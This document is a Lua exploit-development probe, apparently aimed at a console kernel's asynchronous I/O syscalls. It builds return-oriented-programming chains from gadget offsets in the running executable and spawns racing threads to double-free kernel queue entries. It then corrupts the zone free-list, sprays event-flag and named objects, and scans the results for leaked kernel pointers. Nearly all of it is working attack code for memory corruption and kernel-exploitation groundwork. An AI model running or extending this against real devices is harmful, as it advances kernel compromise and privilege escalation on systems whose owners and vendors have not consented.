-- CRASH_CLASS: HIGH
-- PROBE 68a: AIO double-free → zone free-list corruption → object overlap
--
-- Theory: when 662 TOCTOU double-frees the 0x58-byte queue entry (I) from
-- zone 0x1ab5900, the zone free-list gets corrupted: the same slot appears
-- twice. The next TWO allocations from that zone return the SAME pointer.
-- If those two allocations are new AIO queue entries (via 669 submit), the
-- kernel initializes both at the same address. Writing to one corrupts the
-- other → observable through AIO status queries (664/663/666).
--
-- Detection: submit two AIO requests after the double-free. Use different
-- fds for each (fd_A = /dev/zero, fd_B = socketpair read-end). If they
-- overlap:
--   - The file object pointer at I+0x40 gets overwritten by the second init
--   - Completing fd_A's request writes its result, then completing fd_B
--     overwrites the result in the same slot
--   - 663/666 on the first ID may return the second's status
--   - Deleting one frees the shared memory; querying the other crashes or
--     returns garbage
--
-- Unlike prior probes (65o-67m2), this targets the zone-level free list
-- corruption from the actual double-free, not just the TOCTOU window timing.
-- The double-free poisons the allocator; the overlap manifests on the NEXT
-- two allocations from that zone, regardless of timing.

print("=== PROBE 68a: ZONE OVERLAP VIA DOUBLE-FREE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs = memory.alloc(0x30)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one_fd(fd, dbuf, rbuf)
    wq(N(reqs), uint64(1))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function submit_zero()
    local db = memory.alloc(0x100)
    local rb = memory.alloc(0x100)
    return submit_one_fd(fd_zero, db, rb)
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function query_666(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xCD
end

-- Gate socketpairs for synchronized race
local sp_A = memory.alloc(16); wd(N(sp_A), 0xFFFFFFFF); wd(N(sp_A) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_A))) end)
local gra = rd(N(sp_A)) or -1; local gwa = rd(N(sp_A) + 4) or -1

local sp_B = memory.alloc(16); wd(N(sp_B), 0xFFFFFFFF); wd(N(sp_B) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_B))) end)
local grb = rd(N(sp_B)) or -1; local gwb = rd(N(sp_B) + 4) or -1
print(string.format("gates: A=%d/%d B=%d/%d", gra, gwa, grb, gwb))
if gra < 0 or gwa < 0 or grb < 0 or gwb < 0 then print("GATE FAIL"); return end

-- Shared buffers
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- ===================================================
-- [A] CONTROL — normal AIO lifecycle without race
-- ===================================================
print("")
print("-- [A] CONTROL: normal submit/poll/delete/resubmit --")
do
    local c_ids = {}
    for i = 1, 4 do
        local id = submit_zero()
        c_ids[i] = id
        print(string.format("  submit[%d] id=0x%X", i, id))
    end
    for _, id in ipairs(c_ids) do poll_one(id) end
    for _, id in ipairs(c_ids) do
        local st = delete_one(id)
        print(string.format("  delete id=0x%X st=0x%X", id, st))
    end
    local c2_ids = {}
    for i = 1, 4 do
        local id = submit_zero()
        c2_ids[i] = id
        print(string.format("  resubmit[%d] id=0x%X", i, id))
    end
    for _, id in ipairs(c2_ids) do
        local st663 = query_663(id)
        local st666 = query_666(id)
        print(string.format("  query id=0x%X 663=0x%X 666=0x%X", id, st663, st666))
    end
    for _, id in ipairs(c2_ids) do poll_one(id) end
    for _, id in ipairs(c2_ids) do delete_one(id) end
    print("  control done, alive=" .. (alive() and "YES" or "NO"))
end

if not alive() then print("DEAD after control"); return end

-- ===================================================
-- [B] DOUBLE-FREE then immediately resubmit — detect zone overlap
-- ===================================================
print("")
print("-- [B] DOUBLE-FREE + RESUBMIT OVERLAP TEST --")

local TRIALS = 20
local total_doubles = 0
local total_anomalies = 0

for trial = 1, TRIALS do
    if not alive() then print("DEAD at trial " .. trial); break end

    -- Step 1: Submit BATCH victim requests
    local victim_ids = {}
    for i = 1, BATCH do
        local id = submit_zero()
        if id ~= 0 then
            poll_one(id)
            victim_ids[#victim_ids + 1] = id
        end
    end
    if #victim_ids < BATCH then
        print(string.format("  trial %d: SHORT (%d)", trial, #victim_ids))
        break
    end

    -- Step 2: Prepare gated race
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, victim_ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    -- Build child A: marker → read(gate) → 662 → thr_exit
    local sb_a = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb_a + i, 0) end
    local sp_a = sb_a + 0x2000 - ((sb_a + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) wq(sp_a + oa, v); oa = oa + 8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B: marker → read(gate) → 662 → thr_exit
    local sb_b = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb_b + i, 0) end
    local sp_b = sb_b + 0x2000 - ((sb_b + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa) + 0x10, uint64(sb_a))
    wq(N(pa) + 0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb) + i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb) + 0x10, uint64(sb_b))
    wq(N(pb) + 0x18, uint64(0x2000))

    -- Step 3: Spawn both children, wait for markers
    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    local a_ready, b_ready = false, false
    for w = 1, 500000 do
        if not a_ready and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_ready = true end
        if not b_ready and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_ready = true end
        if a_ready and b_ready then break end
    end

    if not (a_ready and b_ready) then
        print(string.format("  trial %d: MARKER TIMEOUT a=%s b=%s", trial, tostring(a_ready), tostring(b_ready)))
        break
    end

    -- Step 4: Release both gates simultaneously
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)

    -- Step 5: Wait for children to finish
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  trial %d: CRASHED during race", trial))
        break
    end

    -- Step 6: Count doubles
    local doubles = 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    -- Step 7: IMMEDIATELY submit 2× BATCH new AIO requests
    -- These should allocate from the corrupted zone free list
    -- Use different fds to distinguish: even=fd_zero, odd=socketpair
    local sp_test = memory.alloc(16)
    wd(N(sp_test), 0xFFFFFFFF); wd(N(sp_test) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_test))) end)
    local fd_sp_r = rd(N(sp_test)) or -1
    local fd_sp_w = rd(N(sp_test) + 4) or -1

    local new_ids = {}
    local new_dbufs = {}
    local new_rbufs = {}
    local new_fds = {}

    for i = 1, BATCH * 2 do
        local db = memory.alloc(0x100)
        local rb = memory.alloc(0x100)
        -- Fill result buf with unique sentinel
        for j = 0, 0xFC, 4 do wd(N(rb) + j, 0xDE000000 + trial * 0x10000 + i) end
        -- Fill data buf with unique pattern
        for j = 0, 0xFC, 4 do wd(N(db) + j, 0xDA000000 + trial * 0x10000 + i) end

        local fd
        if i % 2 == 0 then
            fd = fd_zero
        else
            fd = fd_sp_r
        end

        local id = submit_one_fd(fd, db, rb)
        new_ids[i] = id
        new_dbufs[i] = db
        new_rbufs[i] = rb
        new_fds[i] = fd
    end

    -- Step 8: Write data to socketpair to complete the odd-indexed requests
    local sp_write_buf = memory.alloc(32)
    for j = 0, 28, 4 do wd(N(sp_write_buf) + j, 0xCAFE0000 + trial) end
    if fd_sp_w >= 0 then
        pcall(function()
            mk(4)(uint64(fd_sp_w), uint64(N(sp_write_buf)), uint64(16))
        end)
    end

    -- Wait for completions
    for w = 1, 50000 do end

    -- Step 9: Poll all new IDs and check for anomalies
    local anomalies = 0
    local detail_lines = {}

    for i = 1, BATCH * 2 do
        if not alive() then break end
        local id = new_ids[i]
        if id ~= 0 then
            local st663 = query_663(id)
            local st666 = query_666(id)
            local res_val = rd(N(new_rbufs[i])) or 0xDEADDEAD

            local is_anom = false
            -- Check: result buf modified from sentinel?
            local expected_sentinel = 0xDE000000 + trial * 0x10000 + i
            -- If result changed, AIO completed (or something wrote there)
            local completed = (res_val ~= expected_sentinel)
            -- fd_zero requests should always complete immediately
            -- socketpair requests only complete if data was written

            -- Anomaly: 663 returns unexpected status
            if st663 ~= 0x00000003 and st663 ~= 0x00010003 and st663 ~= 0x80020003 then
                is_anom = true
            end

            -- Anomaly: even-indexed (fd_zero) request didn't complete
            if i % 2 == 0 and not completed then
                is_anom = true
            end

            -- Anomaly: result buf contains a kernel pointer
            local rh, rl = get_hi_lo(rq(N(new_rbufs[i])) or uint64(0))
            if rh >= 0xFFFF8000 then
                is_anom = true
                if #detail_lines < 10 then
                    detail_lines[#detail_lines + 1] = string.format(
                        "  *** KPTR in result[%d]: 0x%08X%08X ***", i, rh, rl)
                end
            end

            -- Anomaly: data buf shows cross-contamination
            local dval = rd(N(new_dbufs[i])) or 0
            local expected_data = 0xDA000000 + trial * 0x10000 + i
            if i % 2 == 0 then
                -- fd_zero read should fill with zeros
                if completed and dval ~= 0 and dval ~= expected_data then
                    is_anom = true
                    if #detail_lines < 10 then
                        detail_lines[#detail_lines + 1] = string.format(
                            "  *** CROSS-CONTAM data[%d]: got 0x%08X expected 0x%08X or 0 ***",
                            i, dval, expected_data)
                    end
                end
            end

            if is_anom then anomalies = anomalies + 1 end
        end
    end

    total_anomalies = total_anomalies + anomalies

    -- Step 10: Try deleting one new ID and querying its "neighbor"
    -- If two new IDs share the same underlying I object, deleting one
    -- should corrupt the other's status
    local del_cross_anom = 0
    if #new_ids >= 4 and alive() then
        for pair_idx = 1, 4 do
            local id_del = new_ids[pair_idx * 2 - 1]
            local id_check = new_ids[pair_idx * 2]
            if id_del ~= 0 and id_check ~= 0 then
                local pre_st = query_663(id_check)
                poll_one(id_del)
                local del_st = delete_one(id_del)
                if not alive() then
                    del_cross_anom = del_cross_anom + 1
                    if #detail_lines < 10 then
                        detail_lines[#detail_lines + 1] = string.format(
                            "  *** CRASH on delete id=0x%X (neighbor=0x%X) ***",
                            id_del, id_check)
                    end
                    break
                end
                local post_st = query_663(id_check)
                if post_st ~= pre_st then
                    del_cross_anom = del_cross_anom + 1
                    if #detail_lines < 10 then
                        detail_lines[#detail_lines + 1] = string.format(
                            "  *** STATUS CHANGE: id=0x%X was 0x%X now 0x%X after deleting 0x%X ***",
                            id_check, pre_st, post_st, id_del)
                    end
                end
            end
        end
    end

    if anomalies > 0 or del_cross_anom > 0 or doubles > 0 or trial <= 3 or trial == TRIALS then
        print(string.format("  trial %d: dbl=%d anom=%d cross=%d alive=%s",
            trial, doubles, anomalies, del_cross_anom, alive() and "Y" or "N"))
        for _, line in ipairs(detail_lines) do print(line) end
    end

    -- Cleanup: delete remaining new IDs
    if alive() then
        for i = 1, BATCH * 2 do
            local id = new_ids[i]
            if id ~= 0 then
                pcall(function() poll_one(id) end)
                pcall(function() delete_one(id) end)
            end
        end
        if fd_sp_r >= 0 then pcall(function() mk(6)(uint64(fd_sp_r)) end) end
        if fd_sp_w >= 0 then pcall(function() mk(6)(uint64(fd_sp_w)) end) end
    end

    -- Drain gate for next iteration
    pcall(function() mk(3)(uint64(gra), uint64(N(tmp_A)), uint64(1)) end)
    pcall(function() mk(3)(uint64(grb), uint64(N(tmp_B)), uint64(1)) end)
end

-- ===================================================
-- [C] AGGRESSIVE — many doubles, then single spray read-back
-- ===================================================
print("")
print("-- [C] AGGRESSIVE: drain zone then read --")

if alive() then
    -- Do 5 rounds of double-free WITHOUT cleanup to accumulate corrupted entries
    local drain_doubles = 0
    for round = 1, 5 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_zero()
            if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
        end
        if #ids < BATCH then break end

        for i = 0, BATCH - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAA)
            wd(N(states_B) + i * 4, 0xBB)
        end
        wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

        local sb_a2 = N(stk_A)
        for i = 0, 0x1FFC, 4 do wd(sb_a2 + i, 0) end
        local sp_a2 = sb_a2 + 0x2000 - ((sb_a2 + 0x2000) % 16) - 8
        local oa2 = 0
        local function wa2(v) wq(sp_a2 + oa2, v); oa2 = oa2 + 8 end
        wa2(g_pop_rax); wa2(uint64(0x41))
        wa2(g_pop_rdi); wa2(uint64(N(marker_A))); wa2(g_mov_m_rax)
        wa2(g_pop_rax); wa2(uint64(3))
        wa2(g_pop_rdi); wa2(uint64(gra))
        wa2(g_pop_rsi); wa2(uint64(N(tmp_A)))
        wa2(g_pop_rdx); wa2(uint64(1)); wa2(stub)
        wa2(g_pop_rdi); wa2(uint64(N(del_ids)))
        wa2(g_pop_rsi); wa2(uint64(BATCH))
        wa2(g_pop_rdx); wa2(uint64(N(states_A)))
        wa2(g_pop_rax); wa2(uint64(662)); wa2(stub)
        wa2(g_pop_rdi); wa2(uint64(0))
        wa2(g_pop_rax); wa2(uint64(431)); wa2(stub)

        local sb_b2 = N(stk_B)
        for i = 0, 0x1FFC, 4 do wd(sb_b2 + i, 0) end
        local sp_b2 = sb_b2 + 0x2000 - ((sb_b2 + 0x2000) % 16) - 8
        local ob2 = 0
        local function wb2(v) wq(sp_b2 + ob2, v); ob2 = ob2 + 8 end
        wb2(g_pop_rax); wb2(uint64(0x42))
        wb2(g_pop_rdi); wb2(uint64(N(marker_B))); wb2(g_mov_m_rax)
        wb2(g_pop_rax); wb2(uint64(3))
        wb2(g_pop_rdi); wb2(uint64(grb))
        wb2(g_pop_rsi); wb2(uint64(N(tmp_B)))
        wb2(g_pop_rdx); wb2(uint64(1)); wb2(stub)
        wb2(g_pop_rdi); wb2(uint64(N(del_ids)))
        wb2(g_pop_rsi); wb2(uint64(BATCH))
        wb2(g_pop_rdx); wb2(uint64(N(states_B)))
        wb2(g_pop_rax); wb2(uint64(662)); wb2(stub)
        wb2(g_pop_rdi); wb2(uint64(0))
        wb2(g_pop_rax); wb2(uint64(431)); wb2(stub)

        local pa2 = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pa2) + i, 0) end
        wq(N(pa2), g_bare_ret)
        wq(N(pa2) + 0x10, uint64(sb_a2))
        wq(N(pa2) + 0x18, uint64(0x2000))

        local pb2 = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pb2) + i, 0) end
        wq(N(pb2), g_bare_ret)
        wq(N(pb2) + 0x10, uint64(sb_b2))
        wq(N(pb2) + 0x18, uint64(0x2000))

        pcall(function() mk(455)(pa2, uint64(0x38)) end)
        pcall(function() mk(455)(pb2, uint64(0x38)) end)

        local ar, br = false, false
        for w = 1, 500000 do
            if not ar and N(rq(N(marker_A)) or uint64(0)) ~= 0 then ar = true end
            if not br and N(rq(N(marker_B)) or uint64(0)) ~= 0 then br = true end
            if ar and br then break end
        end
        if not (ar and br) then break end

        pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
        pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)
        for w = 1, 100000 do end

        local dbl = 0
        for i = 0, BATCH - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAA
            local sB = rd(N(states_B) + i * 4) or 0xBB
            if sA == 0 and sB == 0 then dbl = dbl + 1 end
        end
        drain_doubles = drain_doubles + dbl

        -- Drain gate reads
        pcall(function() mk(3)(uint64(gra), uint64(N(tmp_A)), uint64(1)) end)
        pcall(function() mk(3)(uint64(grb), uint64(N(tmp_B)), uint64(1)) end)
    end

    print(string.format("  drain_doubles=%d alive=%s", drain_doubles, alive() and "Y" or "N"))

    -- Now submit a large batch and scan for kernel pointers or anomalous values
    if alive() and drain_doubles > 0 then
        print("  submitting 128 spray requests...")
        local spray_ids = {}
        local spray_rbufs = {}
        for i = 1, 128 do
            local db = memory.alloc(0x100)
            local rb = memory.alloc(0x100)
            for j = 0, 0xFC, 4 do wd(N(rb) + j, 0xFEED0000 + i) end
            local id = submit_one_fd(fd_zero, db, rb)
            spray_ids[i] = id
            spray_rbufs[i] = rb
        end

        -- Wait for completions
        for w = 1, 100000 do end

        -- Query via 667 (batch info) for raw output
        local info_buf = memory.alloc(0x2000)
        for j = 0, 0x1FFC, 4 do wd(N(info_buf) + j, 0xBEEFBEEF) end
        pcall(function()
            mk(667)(uint64(N(info_buf)), uint64(128))
        end)

        -- Scan info_buf for kernel pointers
        local kptr_count = 0
        local kptr_details = {}
        for off = 0, 0x1FFC, 4 do
            local v = rd(N(info_buf) + off) or 0xBEEFBEEF
            if v ~= 0xBEEFBEEF then
                local qv = rq(N(info_buf) + (off - (off % 8)))
                if qv then
                    local qh, ql = get_hi_lo(qv)
                    if qh >= 0xFFFF8000 then
                        kptr_count = kptr_count + 1
                        if #kptr_details < 10 then
                            kptr_details[#kptr_details + 1] = string.format(
                                "  *** KPTR at 667+0x%X: 0x%08X%08X ***", off - (off % 8), qh, ql)
                        end
                    end
                end
            end
        end

        print(string.format("  667 scan: %d kernel pointers", kptr_count))
        for _, line in ipairs(kptr_details) do print(line) end

        -- Also scan each request's result buffer
        local rb_kptr = 0
        for i = 1, 128 do
            for off = 0, 0xFC, 8 do
                local qv = rq(N(spray_rbufs[i]) + off)
                if qv then
                    local qh, ql = get_hi_lo(qv)
                    if qh >= 0xFFFF8000 then
                        rb_kptr = rb_kptr + 1
                        if rb_kptr <= 5 then
                            print(string.format("  *** KPTR in result[%d]+0x%X: 0x%08X%08X ***",
                                i, off, qh, ql))
                        end
                    end
                end
            end
        end
        print(string.format("  result buf scan: %d kernel pointers", rb_kptr))

        -- Cleanup
        for i = 1, 128 do
            if spray_ids[i] ~= 0 and alive() then
                pcall(function() poll_one(spray_ids[i]) end)
                pcall(function() delete_one(spray_ids[i]) end)
            end
        end
    end
end

-- ===================================================
-- [D] CROSS-OBJECT: double-free AIO, spray with evf/namedobj
-- ===================================================
print("")
print("-- [D] CROSS-OBJECT: spray evf+namedobj after double-free --")

if alive() then
    -- Double-free one batch
    local ids = {}
    for i = 1, BATCH do
        local id = submit_zero()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end

    if #ids >= BATCH then
        for i = 0, BATCH - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAA)
            wd(N(states_B) + i * 4, 0xBB)
        end
        wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

        -- Reuse stk_A/stk_B
        local sb_a3 = N(stk_A)
        for i = 0, 0x1FFC, 4 do wd(sb_a3 + i, 0) end
        local sp_a3 = sb_a3 + 0x2000 - ((sb_a3 + 0x2000) % 16) - 8
        local oa3 = 0
        local function wa3(v) wq(sp_a3 + oa3, v); oa3 = oa3 + 8 end
        wa3(g_pop_rax); wa3(uint64(0x41))
        wa3(g_pop_rdi); wa3(uint64(N(marker_A))); wa3(g_mov_m_rax)
        wa3(g_pop_rdi); wa3(uint64(N(del_ids)))
        wa3(g_pop_rsi); wa3(uint64(BATCH))
        wa3(g_pop_rdx); wa3(uint64(N(states_A)))
        wa3(g_pop_rax); wa3(uint64(662)); wa3(stub)
        wa3(g_pop_rdi); wa3(uint64(0))
        wa3(g_pop_rax); wa3(uint64(431)); wa3(stub)

        local sb_b3 = N(stk_B)
        for i = 0, 0x1FFC, 4 do wd(sb_b3 + i, 0) end
        local sp_b3 = sb_b3 + 0x2000 - ((sb_b3 + 0x2000) % 16) - 8
        local ob3 = 0
        local function wb3(v) wq(sp_b3 + ob3, v); ob3 = ob3 + 8 end
        wb3(g_pop_rax); wb3(uint64(0x42))
        wb3(g_pop_rdi); wb3(uint64(N(marker_B))); wb3(g_mov_m_rax)
        wb3(g_pop_rdi); wb3(uint64(N(del_ids)))
        wb3(g_pop_rsi); wb3(uint64(BATCH))
        wb3(g_pop_rdx); wb3(uint64(N(states_B)))
        wb3(g_pop_rax); wb3(uint64(662)); wb3(stub)
        wb3(g_pop_rdi); wb3(uint64(0))
        wb3(g_pop_rax); wb3(uint64(431)); wb3(stub)

        local pa3 = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pa3) + i, 0) end
        wq(N(pa3), g_bare_ret)
        wq(N(pa3) + 0x10, uint64(sb_a3))
        wq(N(pa3) + 0x18, uint64(0x2000))

        local pb3 = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pb3) + i, 0) end
        wq(N(pb3), g_bare_ret)
        wq(N(pb3) + 0x10, uint64(sb_b3))
        wq(N(pb3) + 0x18, uint64(0x2000))

        pcall(function() mk(455)(pa3, uint64(0x38)) end)
        pcall(function() mk(455)(pb3, uint64(0x38)) end)
        for w = 1, 200000 do end

        local dbl3 = 0
        for i = 0, BATCH - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAA
            local sB = rd(N(states_B) + i * 4) or 0xBB
            if sA == 0 and sB == 0 then dbl3 = dbl3 + 1 end
        end
        print(string.format("  doubles=%d", dbl3))

        if dbl3 > 0 and alive() then
            -- Spray 200 evf objects
            local evf_handles = {}
            for i = 1, 200 do
                local name = put_str(string.format("evf_%04d_AAAABBBBCCCC", i))
                local h_buf = memory.alloc(8); wq(N(h_buf), uint64(0))
                local ok3, ret3 = pcall(function()
                    return mk(538)(uint64(N(name)), uint64(0xDEAD0000 + i))
                end)
                local h = 0
                if ok3 then h = N(ret3) end
                if h ~= 0 and sgn(ret3) ~= -1 then
                    evf_handles[#evf_handles + 1] = h
                end
            end
            print(string.format("  evf sprayed: %d", #evf_handles))

            -- Spray 200 namedobj objects
            local nobj_handles = {}
            for i = 1, 200 do
                local name = put_str(string.format("nobj_%04d_XXXXYYYY", i))
                local ok4, ret4 = pcall(function()
                    return mk(557)(uint64(N(name)))
                end)
                local h = 0
                if ok4 then h = N(ret4) end
                if h ~= 0 and sgn(ret4) ~= -1 then
                    nobj_handles[#nobj_handles + 1] = h
                end
            end
            print(string.format("  namedobj sprayed: %d", #nobj_handles))

            -- Now submit new AIO and check if any request overlaps with evf/namedobj
            local check_ids = {}
            for i = 1, 32 do
                local db = memory.alloc(0x100)
                local rb = memory.alloc(0x100)
                local id = submit_one_fd(fd_zero, db, rb)
                if id ~= 0 then check_ids[#check_ids + 1] = {id = id, rb = rb} end
            end

            for w = 1, 50000 do end

            -- Check if any evf's bit state changed (would indicate overlap)
            local evf_anom = 0
            for _, h in ipairs(evf_handles) do
                local bits_buf = memory.alloc(8); wq(N(bits_buf), uint64(0xDEADDEAD))
                local ok5, ret5 = pcall(function()
                    return mk(543)(uint64(h), uint64(0), uint64(0), uint64(N(bits_buf)))
                end)
                local bits = rq(N(bits_buf))
                if bits then
                    local bh, bl = get_hi_lo(bits)
                    if bl ~= 0xDEADDEAD and bl ~= 0 then
                        evf_anom = evf_anom + 1
                        if evf_anom <= 3 then
                            print(string.format("  *** EVF ANOMALY h=0x%X bits=0x%08X%08X ***",
                                h, bh, bl))
                        end
                    end
                end
            end
            print(string.format("  evf anomalies: %d", evf_anom))

            -- Cleanup
            for _, h in ipairs(evf_handles) do
                pcall(function() mk(539)(uint64(h)) end)
            end
            for _, h in ipairs(nobj_handles) do
                pcall(function() mk(558)(uint64(h)) end)
            end
            for _, item in ipairs(check_ids) do
                pcall(function() poll_one(item.id) end)
                pcall(function() delete_one(item.id) end)
            end
        end
    end
end

print("")
print("-- SUMMARY --")
print(string.format("  total doubles: %d", total_doubles))
print(string.format("  total anomalies: %d", total_anomalies))
print(string.format("  alive: %s", alive() and "YES" or "NO"))
print("")
print("=== 68a DONE ===")
